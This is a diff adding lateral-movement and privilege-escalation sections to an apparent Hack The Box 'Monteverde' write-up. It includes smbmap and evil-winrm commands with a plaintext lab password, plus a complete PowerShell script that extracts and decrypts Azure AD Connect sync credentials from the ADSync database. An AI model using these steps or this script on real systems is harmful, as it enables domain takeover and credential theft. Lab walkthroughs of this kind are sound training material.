@@ -82,4 +82,83 @@ That led to success:
 <img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/5.png
 ">
 
+# Lateral Movement
+We can use ```smbmap``` to see which shares are available to user ```SABatchJobs```. Using the ```-R``` argument lists all files and folders. The ```-x [command]``` let's us run commands, but it didn't work on this target.
+
+```
+smbmap -u SABatchJobs -p SABatchJobs -d Megabank -H 10.10.10.172 -R  
+```
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/6.png
+">
+
+We find an interesting file and download it using the ```-A``` argument.
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/8.png
+">
+
+The content shows us a password.
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/9.png
+">
+
+We'll try this password with the earlier found usernames and are successful with ```mhope```.
+```
+evil-winrm  -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
+```
+
 # Privilege Escalation
+
+Running ```winpeas.bat``` didn't reveal much useful information other than the existence of an ```Azure Admin``` user group.
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/10.png
+">
+
+Browsing around shows us more Azure programs:
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/11.png
+">
+
+I found more info on Azure and found out that we could connect to the local database and pull the configuration. We then can decrypt it to get the username and password for the account that handles replication.
+https://blog.xpnsec.com/azuread-connect-for-redteam/
+
+We can use the script from the blog and run it on our target:
+```
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+```
+We get our username and password and can now use them to login as administrator using  ```evil-winrm```.
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/12.png
+">
+
